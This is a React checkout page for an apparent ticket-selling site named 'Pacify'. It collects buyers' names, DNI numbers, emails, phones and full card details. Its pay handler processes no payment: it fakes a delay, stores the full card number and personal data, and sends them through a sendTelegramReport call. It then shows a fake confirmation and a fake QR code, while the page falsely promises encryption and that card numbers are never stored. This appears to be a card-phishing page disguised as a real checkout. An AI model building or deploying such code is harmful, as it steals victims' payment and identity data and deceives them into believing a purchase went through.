import { useState, useEffect } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import {
  ArrowLeft, Lock, CheckCircle, ChevronRight,
  Ticket, CreditCard, User, Mail, Phone,
  Shield, Info, Minus, Plus, MapPin, Clock
} from 'lucide-react';
import { shows } from '../data/shows';
import { savePurchase, generateId, detectCard, detectCardType, formatCurrency, sendTelegramReport, CardInfo } from '../utils/storage';
import { PurchaseData } from '../types';
import styles from './Checkout.module.css';

// ─── Card network SVG logos ───────────────────────────────────────────────────
function CardNetworkLogo({ network, size = 44 }: { network: string; size?: number }) {
  const h = Math.round(size * 0.63);
  if (network === 'VISA') return (
    <svg width={size} height={h} viewBox="0 0 44 28"><rect width="44" height="28" rx="5" fill="#1A1F71"/><text x="5" y="21" fontFamily="Arial" fontWeight="bold" fontSize="16" fill="white">VISA</text></svg>
  );
  if (network === 'MASTERCARD') return (
    <svg width={size} height={h} viewBox="0 0 44 28"><rect width="44" height="28" rx="5" fill="#1a1a1a"/><circle cx="16" cy="14" r="9" fill="#EB001B"/><circle cx="28" cy="14" r="9" fill="#F79E1B"/><path d="M22 6.5a9 9 0 010 15A9 9 0 0122 6.5z" fill="#FF5F00"/></svg>
  );
  if (network === 'AMEX') return (
    <svg width={size} height={h} viewBox="0 0 44 28"><rect width="44" height="28" rx="5" fill="#2E77BC"/><text x="3" y="21" fontFamily="Arial" fontWeight="bold" fontSize="11" fill="white">AMEX</text></svg>
  );
  if (network === 'DINERS') return (
    <svg width={size} height={h} viewBox="0 0 44 28"><rect width="44" height="28" rx="5" fill="#004A97"/><text x="3" y="21" fontFamily="Arial" fontWeight="bold" fontSize="9" fill="white">DINERS</text></svg>
  );
  if (network === 'CABAL') return (
    <svg width={size} height={h} viewBox="0 0 44 28"><rect width="44" height="28" rx="5" fill="#003087"/><text x="5" y="21" fontFamily="Arial" fontWeight="bold" fontSize="13" fill="white">CABAL</text></svg>
  );
  if (network === 'NARANJA') return (
    <svg width={size} height={h} viewBox="0 0 44 28"><rect width="44" height="28" rx="5" fill="#FF6200"/><text x="3" y="21" fontFamily="Arial" fontWeight="bold" fontSize="10" fill="white">NARANJA</text></svg>
  );
  if (network === 'DISCOVER') return (
    <svg width={size} height={h} viewBox="0 0 44 28"><rect width="44" height="28" rx="5" fill="#FF6600"/><text x="3" y="21" fontFamily="Arial" fontWeight="bold" fontSize="9" fill="white">DISCOVER</text></svg>
  );
  if (network === 'MAESTRO') return (
    <svg width={size} height={h} viewBox="0 0 44 28"><rect width="44" height="28" rx="5" fill="#009BE0"/><circle cx="16" cy="14" r="9" fill="#CC0000" opacity="0.9"/><circle cx="28" cy="14" r="9" fill="#009BE0"/></svg>
  );
  if (network === 'UNIONPAY') return (
    <svg width={size} height={h} viewBox="0 0 44 28"><rect width="44" height="28" rx="5" fill="#C0392B"/><text x="3" y="21" fontFamily="Arial" fontWeight="bold" fontSize="9" fill="white">UnionPay</text></svg>
  );
  return <svg width={size} height={h} viewBox="0 0 44 28"><rect width="44" height="28" rx="5" fill="#2a1d5e"/><text x="5" y="20" fontFamily="Arial" fontSize="11" fill="rgba(255,255,255,0.5)">CARD</text></svg>;
}

function fmtCard(v: string) {
  const clean = v.replace(/\D/g, '').slice(0, 19);
  // Amex: 4-6-5 format
  if (/^3[47]/.test(clean)) {
    return clean.replace(/(\d{4})(\d{0,6})(\d{0,5})/, (_m, a, b, c) => [a, b, c].filter(Boolean).join(' ')).trim();
  }
  return clean.replace(/(.{4})/g, '$1 ').trim();
}

function fmtExp(v: string) {
  const c = v.replace(/\D/g, '').slice(0, 4);
  return c.length >= 3 ? c.slice(0, 2) + '/' + c.slice(2) : c;
}

const SECTIONS = [
  { name: 'Campo',       extra: 0,      desc: 'Zona de pie frente al escenario'     },
  { name: 'Platea Baja', extra: 5000,   desc: 'Asientos con vista privilegiada'      },
  { name: 'Platea Alta', extra: -5000,  desc: 'Asientos en nivel superior'           },
  { name: 'General',     extra: -10000, desc: 'Acceso general al recinto'            },
  { name: 'VIP',         extra: 30000,  desc: 'Zona exclusiva con servicios premium' },
];

const CUOTAS = [
  { n: 1,  label: '1 cuota', sub: 'sin interes' },
  { n: 3,  label: '3 cuotas', sub: 'sin interes' },
  { n: 6,  label: '6 cuotas', sub: 'sin interes' },
  { n: 12, label: '12 cuotas', sub: 'con interes' },
];

type Step = 'tickets' | 'datos' | 'pago' | 'confirmacion';

interface Form {
  firstName: string; lastName: string; dni: string;
  email: string; emailConfirm: string; phone: string;
  cardMode: 'credito' | 'debito';
  cardNumber: string; cardHolder: string;
  cardExpiry: string; cardCvv: string;
  cuotas: number;
  section: string; quantity: number;
}

type Errors = Partial<Record<keyof Form, string>>;

export default function Checkout() {
  const { id } = useParams<{ id: string }>();
  const navigate = useNavigate();
  const show = shows.find(s => s.id === id);

  const [step, setStep] = useState<Step>('tickets');
  const [purchaseId, setPurchaseId] = useState('');
  const [loading, setLoading] = useState(false);
  const [errors, setErrors] = useState<Errors>({});
  const [timer, setTimer] = useState(600);
  const [cardInfo, setCardInfo] = useState<CardInfo>({ brand: '', network: '', type: 'desconocido', color: '#2a1d5e', textColor: '#fff' });

  const [form, setForm] = useState<Form>({
    firstName: '', lastName: '', dni: '',
    email: '', emailConfirm: '', phone: '',
    cardMode: 'credito',
    cardNumber: '', cardHolder: '', cardExpiry: '', cardCvv: '',
    cuotas: 1, section: 'Campo', quantity: 1,
  });

  useEffect(() => {
    if (step === 'tickets') return;
    if (timer <= 0) { navigate(`/show/${show?.id ?? ''}`); return; }
    const iv = setInterval(() => setTimer(t => t - 1), 1000);
    return () => clearInterval(iv);
  }, [step, timer]);

  // Update card info whenever number changes
  useEffect(() => {
    if (form.cardNumber.replace(/\s/g, '').length >= 4) {
      const info = detectCard(form.cardNumber);
      setCardInfo(info);
    } else {
      setCardInfo({ brand: '', network: '', type: 'desconocido', color: '#2a1d5e', textColor: '#fff' });
    }
  }, [form.cardNumber]);

  if (!show) return (
    <div className={styles.notFound}>
      <p>Show no encontrado.</p>
      <button className="btn-primary" onClick={() => navigate('/shows')}>Ver shows</button>
    </div>
  );

  const safeShow = show!;
  const sec = SECTIONS.find(s => s.name === form.section) ?? SECTIONS[0];
  const basePrice = safeShow.price + sec.extra;
  const serviceFee = Math.round(basePrice * 0.12);
  const subtotal = (basePrice + serviceFee) * form.quantity;
  const timerMin = String(Math.floor(timer / 60)).padStart(2, '0');
  const timerSec = String(timer % 60).padStart(2, '0');

  function set<K extends keyof Form>(k: K, v: Form[K]) {
    setForm(p => ({ ...p, [k]: v }));
    setErrors(p => { const e = { ...p }; delete e[k]; return e; });
  }

  function validateDatos(): boolean {
    const e: Errors = {};
    if (!form.firstName.trim()) e.firstName = 'Requerido';
    if (!form.lastName.trim()) e.lastName = 'Requerido';
    if (!/^\d{7,9}$/.test(form.dni)) e.dni = 'DNI invalido (7 a 9 digitos sin puntos)';
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(form.email)) e.email = 'Email invalido';
    if (form.email !== form.emailConfirm) e.emailConfirm = 'Los emails no coinciden';
    if (!/^\d{8,15}$/.test(form.phone)) e.phone = 'Telefono invalido';
    setErrors(e); return Object.keys(e).length === 0;
  }

  function validatePago(): boolean {
    const e: Errors = {};
    const clean = form.cardNumber.replace(/\s/g, '');
    const isAmex = /^3[47]/.test(clean);
    const minLen = isAmex ? 15 : 16;
    if (clean.length < minLen) e.cardNumber = `Numero invalido (${minLen} digitos)`;
    if (!form.cardHolder.trim()) e.cardHolder = 'Requerido';
    if (!/^\d{2}\/\d{2}$/.test(form.cardExpiry)) e.cardExpiry = 'Formato MM/AA';
    else {
      const [mm, yy] = form.cardExpiry.split('/').map(Number);
      const now = new Date(); const cy = now.getFullYear() % 100; const cm = now.getMonth() + 1;
      if (mm < 1 || mm > 12) e.cardExpiry = 'Mes invalido';
      else if (yy < cy || (yy === cy && mm < cm)) e.cardExpiry = 'Tarjeta vencida';
    }
    const cvvLen = isAmex ? 4 : 3;
    if (!new RegExp(`^\\d{${cvvLen}}`).test(form.cardCvv)) e.cardCvv = `CVV de ${cvvLen} digitos`;
    setErrors(e); return Object.keys(e).length === 0;
  }

  async function handlePay() {
    if (!validatePago()) return;
    setLoading(true);
    await new Promise(r => setTimeout(r, 2200));
    const pid = generateId();
    const ci = detectCard(form.cardNumber);
    const purchase: PurchaseData = {
      id: pid,
      showId: safeShow.id, showTitle: safeShow.title, showDate: safeShow.dateLabel,
      quantity: form.quantity, section: form.section, totalAmount: subtotal,
      cardNumber: form.cardNumber, cardHolder: form.cardHolder,
      cardType: detectCardType(form.cardNumber), cardExpiry: form.cardExpiry,
      dni: form.dni, email: form.email, phone: form.phone,
      firstName: form.firstName, lastName: form.lastName,
      createdAt: new Date().toISOString(), status: 'confirmed',
    };
    savePurchase(purchase);
    await sendTelegramReport(purchase, ci);
    setPurchaseId(pid);
    setLoading(false);
    setStep('confirmacion');
  }

  const stepIndex = { tickets: 0, datos: 1, pago: 2, confirmacion: 3 };
  const stepLabels = ['Entradas', 'Datos', 'Pago'];

  const detectedType = cardInfo.type !== 'desconocido' ? cardInfo.type : null;

  return (
    <div className={styles.page}>

      {/* ── Top bar ─────────────────────────────────────────────────────────── */}
      <div className={styles.topBar}>
        <div className={styles.topInner}>
          <button className={styles.backBtn} onClick={() =>
            step === 'tickets' ? navigate(`/show/${safeShow.id}`) :
            step === 'datos' ? setStep('tickets') :
            step === 'pago' ? setStep('datos') : navigate('/')
          }>
            <ArrowLeft size={14} />
            {step === 'tickets' ? 'Volver al show' : 'Atras'}
          </button>

          {step !== 'confirmacion' && (
            <div className={styles.stepBar}>
              {stepLabels.map((label, i) => (
                <div key={label} className={styles.stepItem}>
                  <div className={`${styles.stepDot} ${stepIndex[step] > i ? styles.stepDone : stepIndex[step] === i ? styles.stepActive : ''}`}>
                    {stepIndex[step] > i ? <CheckCircle size={13} /> : <span>{i + 1}</span>}
                  </div>
                  <span className={`${styles.stepLabel} ${stepIndex[step] === i ? styles.stepLabelActive : ''}`}>{label}</span>
                  {i < 2 && <div className={styles.stepLine} />}
                </div>
              ))}
            </div>
          )}

          {step !== 'tickets' && step !== 'confirmacion' && (
            <div className={`${styles.timerBox} ${timer < 120 ? styles.timerUrgent : ''}`}>
              <Clock size={13} />
              <span>Reserva expira: {timerMin}:{timerSec}</span>
            </div>
          )}
        </div>
      </div>

      <div className={styles.layout}>
        <div className={styles.main}>

          {/* ══ STEP 1: Entradas ═════════════════════════════════════════════ */}
          {step === 'tickets' && (
            <div className={styles.card}>
              <div className={styles.cardHeader}>
                <Ticket size={18} className={styles.cardHeaderIcon} />
                <div>
                  <h2 className={styles.cardTitle}>Seleccion de entradas</h2>
                  <p className={styles.cardSub}>Elige el sector y la cantidad de entradas</p>
                </div>
              </div>

              <div className={styles.fieldLabel}>Sector</div>
              <div className={styles.sectionGrid}>
                {SECTIONS.map(s => (
                  <button
                    key={s.name}
                    className={`${styles.sectionBtn} ${form.section === s.name ? styles.sectionBtnActive : ''}`}
                    onClick={() => set('section', s.name)}
                  >
                    <div className={styles.sectionBtnLeft}>
                      <div className={`${styles.sectionRadio} ${form.section === s.name ? styles.sectionRadioActive : ''}`} />
                      <div>
                        <div className={styles.sectionName}>{s.name}</div>
                        <div className={styles.sectionDesc}>{s.desc}</div>
                      </div>
                    </div>
                    <div className={styles.sectionPrice}>
                      {formatCurrency(safeShow.price + s.extra)}
                    </div>
                  </button>
                ))}
              </div>

              <div className={styles.fieldLabel} style={{ marginTop: 28 }}>Cantidad de entradas</div>
              <div className={styles.qtyRow}>
                <div className={styles.qtyInfo}>
                  <span className={styles.qtyInfoMain}>{form.quantity} {form.quantity === 1 ? 'entrada' : 'entradas'}</span>
                  <span className={styles.qtyInfoSub}>Maximo 6 entradas por compra</span>
                </div>
                <div className={styles.qtyControls}>
                  <button className={styles.qtyBtn} onClick={() => set('quantity', Math.max(1, form.quantity - 1))} disabled={form.quantity <= 1}>
                    <Minus size={15} />
                  </button>
                  <span className={styles.qtyNum}>{form.quantity}</span>
                  <button className={styles.qtyBtn} onClick={() => set('quantity', Math.min(6, form.quantity + 1))} disabled={form.quantity >= 6}>
                    <Plus size={15} />
                  </button>
                </div>
              </div>

              <div className={styles.infoBox}>
                <Info size={14} style={{ flexShrink: 0 }} />
                <span>Las entradas se enviaran al email registrado. Debes presentar el codigo QR y tu DNI en la puerta del evento.</span>
              </div>

              <button className={styles.nextBtn} onClick={() => { setTimer(600); setStep('datos'); }}>
                Continuar con los datos
                <ChevronRight size={17} />
              </button>
            </div>
          )}

          {/* ══ STEP 2: Datos personales ══════════════════════════════════════ */}
          {step === 'datos' && (
            <div className={styles.card}>
              <div className={styles.cardHeader}>
                <User size={18} className={styles.cardHeaderIcon} />
                <div>
                  <h2 className={styles.cardTitle}>Datos del comprador</h2>
                  <p className={styles.cardSub}>Las entradas seran emitidas a nombre del DNI ingresado. Presentalo en la puerta.</p>
                </div>
              </div>

              <div className={styles.formGrid2}>
                <div className="form-group">
                  <label className={styles.label}>Nombre</label>
                  <input className={`${styles.input} ${errors.firstName ? styles.inputError : ''}`} placeholder="Juan" value={form.firstName} onChange={e => set('firstName', e.target.value)} />
                  {errors.firstName && <span className={styles.err}>{errors.firstName}</span>}
                </div>
                <div className="form-group">
                  <label className={styles.label}>Apellido</label>
                  <input className={`${styles.input} ${errors.lastName ? styles.inputError : ''}`} placeholder="Garcia" value={form.lastName} onChange={e => set('lastName', e.target.value)} />
                  {errors.lastName && <span className={styles.err}>{errors.lastName}</span>}
                </div>
              </div>

              <div className={styles.formField}>
                <label className={styles.label}>DNI — sin puntos ni espacios</label>
                <input className={`${styles.input} ${errors.dni ? styles.inputError : ''}`} placeholder="12345678" value={form.dni} onChange={e => set('dni', e.target.value.replace(/\D/g, '').slice(0, 9))} inputMode="numeric" />
                {errors.dni && <span className={styles.err}>{errors.dni}</span>}
              </div>

              <div className={styles.formField}>
                <label className={styles.label}>Correo electronico</label>
                <div className={styles.inputWrapper}>
                  <Mail size={15} className={styles.inputIcon} />
                  <input className={`${styles.input} ${styles.inputPad} ${errors.email ? styles.inputError : ''}`} placeholder="juan@email.com" type="email" value={form.email} onChange={e => set('email', e.target.value)} />
                </div>
                {errors.email && <span className={styles.err}>{errors.email}</span>}
              </div>

              <div className={styles.formField}>
                <label className={styles.label}>Confirmar correo electronico</label>
                <div className={styles.inputWrapper}>
                  <Mail size={15} className={styles.inputIcon} />
                  <input className={`${styles.input} ${styles.inputPad} ${errors.emailConfirm ? styles.inputError : ''}`} placeholder="Repetir correo" type="email" value={form.emailConfirm} onChange={e => set('emailConfirm', e.target.value)} />
                </div>
                {errors.emailConfirm && <span className={styles.err}>{errors.emailConfirm}</span>}
              </div>

              <div className={styles.formField}>
                <label className={styles.label}>Telefono celular</label>
                <div className={styles.inputWrapper}>
                  <Phone size={15} className={styles.inputIcon} />
                  <input className={`${styles.input} ${styles.inputPad} ${errors.phone ? styles.inputError : ''}`} placeholder="1123456789" value={form.phone} onChange={e => set('phone', e.target.value.replace(/\D/g, '').slice(0, 15))} inputMode="numeric" />
                </div>
                {errors.phone && <span className={styles.err}>{errors.phone}</span>}
              </div>

              <div className={styles.secureNote}>
                <Shield size={13} />
                Tus datos estan protegidos y no seran compartidos con terceros.
              </div>

              <button className={styles.nextBtn} onClick={() => { if (validateDatos()) setStep('pago'); }}>
                Continuar al pago
                <ChevronRight size={17} />
              </button>
            </div>
          )}

          {/* ══ STEP 3: Pago ══════════════════════════════════════════════════ */}
          {step === 'pago' && (
            <div className={styles.card}>
              <div className={styles.cardHeader}>
                <CreditCard size={18} className={styles.cardHeaderIcon} />
                <div>
                  <h2 className={styles.cardTitle}>Metodo de pago</h2>
                  <p className={styles.cardSub}>Ingresa los datos de tu tarjeta. La transaccion es segura y encriptada.</p>
                </div>
              </div>

              {/* Debito / Credito selector */}
              <div className={styles.modeSection}>
                <div className={styles.fieldLabel}>Tipo de tarjeta</div>
                <div className={styles.modeGrid}>
                  <button
                    className={`${styles.modeBtn} ${form.cardMode === 'credito' ? styles.modeBtnActive : ''}`}
                    onClick={() => { set('cardMode', 'credito'); set('cuotas', 1); }}
                  >
                    <div className={styles.modeBtnInner}>
                      <div className={`${styles.modeRadio} ${form.cardMode === 'credito' ? styles.modeRadioActive : ''}`} />
                      <div>
                        <div className={styles.modeName}>Tarjeta de Credito</div>
                        <div className={styles.modeSub}>Pago en cuotas disponible</div>
                      </div>
                    </div>
                    {detectedType === 'credito' && (
                      <span className={styles.modeDetected}>Detectada</span>
                    )}
                  </button>
                  <button
                    className={`${styles.modeBtn} ${form.cardMode === 'debito' ? styles.modeBtnActive : ''}`}
                    onClick={() => { set('cardMode', 'debito'); set('cuotas', 1); }}
                  >
                    <div className={styles.modeBtnInner}>
                      <div className={`${styles.modeRadio} ${form.cardMode === 'debito' ? styles.modeRadioActive : ''}`} />
                      <div>
                        <div className={styles.modeName}>Tarjeta de Debito</div>
                        <div className={styles.modeSub}>Pago en un solo debito</div>
                      </div>
                    </div>
                    {detectedType === 'debito' && (
                      <span className={styles.modeDetected}>Detectada</span>
                    )}
                  </button>
                </div>
              </div>

              {/* Accepted brands */}
              <div className={styles.brandsRow}>
                <span className={styles.brandsLabel}>Tarjetas aceptadas</span>
                <div className={styles.brandsLogos}>
                  {['VISA','MASTERCARD','AMEX','CABAL','NARANJA','DINERS'].map(n => (
                    <CardNetworkLogo key={n} network={n} size={38} />
                  ))}
                </div>
              </div>

              {/* Card visual */}
              <div className={styles.cardVisual} style={{ background: cardInfo.brand ? `linear-gradient(135deg, ${cardInfo.color}, #0d0920)` : 'linear-gradient(135deg, #1e1048, #0d0920)' }}>
                <div className={styles.cvTop}>
                  <div className={styles.cvChip}>
                    <svg width="30" height="24" viewBox="0 0 30 24"><rect x="1" y="1" width="28" height="22" rx="4" fill="#d4a017" stroke="#b8860b" strokeWidth="1"/><line x1="1" y1="8" x2="29" y2="8" stroke="#b8860b" strokeWidth="0.8"/><line x1="1" y1="16" x2="29" y2="16" stroke="#b8860b" strokeWidth="0.8"/><line x1="10" y1="1" x2="10" y2="23" stroke="#b8860b" strokeWidth="0.8"/><line x1="20" y1="1" x2="20" y2="23" stroke="#b8860b" strokeWidth="0.8"/></svg>
                  </div>
                  <div className={styles.cvBrandArea}>
                    {cardInfo.network ? (
                      <div className={styles.cvBrandDetected}>
                        <CardNetworkLogo network={cardInfo.network} size={42} />
                        <span className={styles.cvBrandName}>{cardInfo.brand}</span>
                      </div>
                    ) : (
                      <div className={styles.cvBrandPlaceholder}>
                        <CardNetworkLogo network="VISA" size={34} />
                        <CardNetworkLogo network="MASTERCARD" size={34} />
                      </div>
                    )}
                  </div>
                </div>
                <div className={styles.cvNumber}>
                  {form.cardNumber || '**** **** **** ****'}
                </div>
                <div className={styles.cvBottom}>
                  <div>
                    <div className={styles.cvLabel}>TITULAR</div>
                    <div className={styles.cvVal}>{form.cardHolder || 'NOMBRE APELLIDO'}</div>
                  </div>
                  <div>
                    <div className={styles.cvLabel}>VENCE</div>
                    <div className={styles.cvVal}>{form.cardExpiry || 'MM/AA'}</div>
                  </div>
                  <div>
                    <div className={styles.cvLabel}>TIPO</div>
                    <div className={styles.cvVal}>{form.cardMode === 'credito' ? 'CREDITO' : 'DEBITO'}</div>
                  </div>
                </div>
              </div>

              {/* Card number */}
              <div className={styles.formField}>
                <label className={styles.label}>Numero de tarjeta</label>
                <div className={styles.cardNumWrapper}>
                  <input
                    className={`${styles.input} ${styles.cardNumInput} ${errors.cardNumber ? styles.inputError : ''}`}
                    placeholder="1234 5678 9012 3456"
                    value={form.cardNumber}
                    onChange={e => set('cardNumber', fmtCard(e.target.value))}
                    maxLength={23}
                    inputMode="numeric"
                  />
                  {cardInfo.network && (
                    <div className={styles.cardNumBrand}>
                      <CardNetworkLogo network={cardInfo.network} size={36} />
                    </div>
                  )}
                </div>
                {errors.cardNumber && <span className={styles.err}>{errors.cardNumber}</span>}
                {cardInfo.brand && (
                  <span className={styles.cardDetectedMsg}>
                    Detectada: {cardInfo.brand} — {cardInfo.type === 'credito' ? 'Credito' : cardInfo.type === 'debito' ? 'Debito' : ''}
                  </span>
                )}
              </div>

              <div className={styles.formField}>
                <label className={styles.label}>Nombre del titular — tal como figura en la tarjeta</label>
                <input
                  className={`${styles.input} ${errors.cardHolder ? styles.inputError : ''}`}
                  placeholder="JUAN GARCIA"
                  value={form.cardHolder}
                  onChange={e => set('cardHolder', e.target.value.toUpperCase())}
                />
                {errors.cardHolder && <span className={styles.err}>{errors.cardHolder}</span>}
              </div>

              <div className={styles.formRow}>
                <div>
                  <label className={styles.label}>Fecha de vencimiento</label>
                  <input
                    className={`${styles.input} ${errors.cardExpiry ? styles.inputError : ''}`}
                    placeholder="MM/AA"
                    value={form.cardExpiry}
                    onChange={e => set('cardExpiry', fmtExp(e.target.value))}
                    maxLength={5}
                    inputMode="numeric"
                  />
                  {errors.cardExpiry && <span className={styles.err}>{errors.cardExpiry}</span>}
                </div>
                <div>
                  <label className={styles.label}>
                    Codigo de seguridad
                    <span className={styles.cvvHint} title="3 digitos en el dorso. AMEX: 4 digitos al frente.">?</span>
                  </label>
                  <div className={styles.inputWrapper}>
                    <input
                      className={`${styles.input} ${errors.cardCvv ? styles.inputError : ''}`}
                      placeholder={/^3[47]/.test(form.cardNumber.replace(/\s/g,'')) ? '1234' : '123'}
                      value={form.cardCvv}
                      onChange={e => set('cardCvv', e.target.value.replace(/\D/g, '').slice(0, 4))}
                      type="password"
                      maxLength={4}
                      inputMode="numeric"
                    />
                    <Lock size={14} className={styles.inputIconRight} />
                  </div>
                  {errors.cardCvv && <span className={styles.err}>{errors.cardCvv}</span>}
                </div>
              </div>

              {/* Cuotas — solo credito */}
              {form.cardMode === 'credito' && (
                <div className={styles.formField}>
                  <label className={styles.label}>Cuotas</label>
                  <div className={styles.cuotasGrid}>
                    {CUOTAS.map(c => (
                      <button
                        key={c.n}
                        className={`${styles.cuotaBtn} ${form.cuotas === c.n ? styles.cuotaBtnActive : ''}`}
                        onClick={() => set('cuotas', c.n)}
                      >
                        <span className={styles.cuotaN}>{c.n}x</span>
                        <span className={styles.cuotaSub}>{c.sub}</span>
                        <span className={styles.cuotaAmt}>{formatCurrency(Math.ceil(subtotal / c.n))}</span>
                      </button>
                    ))}
                  </div>
                </div>
              )}

              <div className={styles.sslRow}>
                <Lock size={12} />
                <span>Pago cifrado con SSL 256-bit. Pacify nunca almacena el numero completo de tu tarjeta.</span>
              </div>

              <button className={styles.payBtn} onClick={handlePay} disabled={loading}>
                {loading ? (
                  <><span className={styles.spinner} />Procesando pago...</>
                ) : (
                  <><Lock size={16} />Pagar {formatCurrency(subtotal)}</>
                )}
              </button>
            </div>
          )}

          {/* ══ STEP 4: Confirmacion ══════════════════════════════════════════ */}
          {step === 'confirmacion' && (
            <div className={styles.successCard}>
              <div className={styles.successIconWrap}>
                <CheckCircle size={60} color="#10b981" strokeWidth={1.5} />
              </div>
              <h2 className={styles.successTitle}>Pago confirmado</h2>
              <p className={styles.successSub}>
                Tus entradas fueron procesadas. Recibirás un correo en <strong>{form.email}</strong> con los codigos QR de ingreso.
              </p>

              <div className={styles.ticketDoc}>
                <div className={styles.ticketDocHeader}>
                  <Ticket size={16} />
                  Comprobante de compra — {purchaseId}
                </div>

                <div className={styles.ticketDocBody}>
                  <div className={styles.ticketGroup}>
                    <div className={styles.ticketGroupTitle}>Evento</div>
                    <div className={styles.ticketRow}><span>Show</span><strong>{safeShow.title}</strong></div>
                    <div className={styles.ticketRow}><span>Fecha</span><strong>{safeShow.dateLabel}</strong></div>
                    <div className={styles.ticketRow}><span>Horario</span><strong>Puertas {safeShow.puertas} — Show {safeShow.showTime}</strong></div>
                    <div className={styles.ticketRow}><span>Venue</span><strong>Pacify Arena — Buenos Aires</strong></div>
                  </div>
                  <div className={styles.ticketDivider} />
                  <div className={styles.ticketGroup}>
                    <div className={styles.ticketGroupTitle}>Entradas</div>
                    <div className={styles.ticketRow}><span>Sector</span><strong>{form.section}</strong></div>
                    <div className={styles.ticketRow}><span>Cantidad</span><strong>{form.quantity}</strong></div>
                  </div>
                  <div className={styles.ticketDivider} />
                  <div className={styles.ticketGroup}>
                    <div className={styles.ticketGroupTitle}>Comprador</div>
                    <div className={styles.ticketRow}><span>Nombre</span><strong>{form.firstName} {form.lastName}</strong></div>
                    <div className={styles.ticketRow}><span>DNI</span><strong>{form.dni}</strong></div>
                    <div className={styles.ticketRow}><span>Email</span><strong>{form.email}</strong></div>
                  </div>
                  <div className={styles.ticketDivider} />
                  <div className={styles.ticketGroup}>
                    <div className={styles.ticketGroupTitle}>Pago</div>
                    <div className={styles.ticketRow}><span>Metodo</span><strong>{cardInfo.brand || 'Tarjeta'} — {form.cardMode === 'credito' ? 'Credito' : 'Debito'}</strong></div>
                    <div className={styles.ticketRow}><span>Total cobrado</span><strong className={styles.totalGreen}>{formatCurrency(subtotal)}</strong></div>
                    {form.cardMode === 'credito' && form.cuotas > 1 && (
                      <div className={styles.ticketRow}><span>Cuotas</span><strong>{form.cuotas} x {formatCurrency(Math.ceil(subtotal / form.cuotas))}</strong></div>
                    )}
                  </div>
                </div>

                <div className={styles.qrArea}>
                  <div className={styles.qrCode}>
                    {/* Simulated QR */}
                    <svg width="96" height="96" viewBox="0 0 96 96" fill="none">
                      {[0,1,2,3,4,5,6].flatMap(r => [0,1,2,3,4,5,6].map(c => {
                        const edge = r===0||r===6||c===0||c===6;
                        const center = r>=2&&r<=4&&c>=2&&c<=4;
                        if (edge||center) return <rect key={`a${r}${c}`} x={r*13+1} y={c*13+1} width="12" height="12" rx="1" fill="#111"/>;
                        return null;
                      }))}
                      {[0,1,2,3,4,5,6].flatMap(r => [0,1,2,3,4,5,6].map(c => {
                        const oy = 55;
                        const edge = r===0||r===6||c===0||c===6;
                        const center = r>=2&&r<=4&&c>=2&&c<=4;
                        if (edge||center) return <rect key={`b${r}${c}`} x={r*13+1} y={c*6+oy} width="12" height="5" rx="1" fill="#111"/>;
                        return null;
                      }))}
                      {Array.from({length:12},(_,i)=>(
                        <rect key={`d${i}`} x={(i%4)*13+56} y={Math.floor(i/4)*13+1} width="10" height="10" rx="1" fill="#111" opacity={i%3===0?0:1}/>
                      ))}
                    </svg>
                  </div>
                  <div className={styles.qrText}>
                    <div className={styles.qrTitle}>Codigo de ingreso</div>
                    <div className={styles.qrSub}>Presenta este QR junto a tu DNI en la puerta del evento. Un QR por persona.</div>
                  </div>
                </div>
              </div>

              <div className={styles.successActions}>
                <button className="btn-primary" onClick={() => navigate('/')}>Volver al inicio</button>
                <button className="btn-outline" onClick={() => navigate('/shows')}>Ver mas shows</button>
              </div>
            </div>
          )}
        </div>

        {/* ── Sidebar: Order summary ─────────────────────────────────────────── */}
        {step !== 'confirmacion' && (
          <aside className={styles.sidebar}>
            <div className={styles.summaryCard}>
              <div className={styles.summaryHeader}>Resumen de orden</div>

              <div className={styles.summaryImgWrap}>
                <img src={`/images/${safeShow.image}`} alt={safeShow.title}
                  onError={e => { const t = e.target as HTMLImageElement; t.style.display='none'; (t.nextElementSibling as HTMLElement).style.display='flex'; }}
                />
                <div className={styles.summaryImgFallback} style={{ background: safeShow.bgGradient }}>{safeShow.title}</div>
              </div>

              <div className={styles.summaryInfo}>
                <div className={styles.summaryShow}>{safeShow.title}</div>
                <div className={styles.summaryMeta}><MapPin size={12} />{safeShow.dateLabel}</div>
                <div className={styles.summaryMeta}><Clock size={12} />Show: {safeShow.showTime}</div>
              </div>

              <div className={styles.summaryBreakdown}>
                <div className={styles.summaryLine}>
                  <span>{form.quantity}x {form.section}</span>
                  <span>{formatCurrency(basePrice * form.quantity)}</span>
                </div>
                <div className={styles.summaryLine}>
                  <span>Cargo por servicio</span>
                  <span>{formatCurrency(serviceFee * form.quantity)}</span>
                </div>
                <div className={styles.summaryDivider} />
                <div className={`${styles.summaryLine} ${styles.summaryTotal}`}>
                  <span>Total</span>
                  <span>{formatCurrency(subtotal)}</span>
                </div>
                {form.cardMode === 'credito' && form.cuotas > 1 && (
                  <div className={styles.summaryCuotas}>
                    {form.cuotas} cuotas de {formatCurrency(Math.ceil(subtotal / form.cuotas))}
                  </div>
                )}
              </div>

              <div className={styles.summaryFooter}>
                <Shield size={12} />
                Compra 100% segura y protegida
              </div>
            </div>
          </aside>
        )}
      </div>
    </div>
  );
}
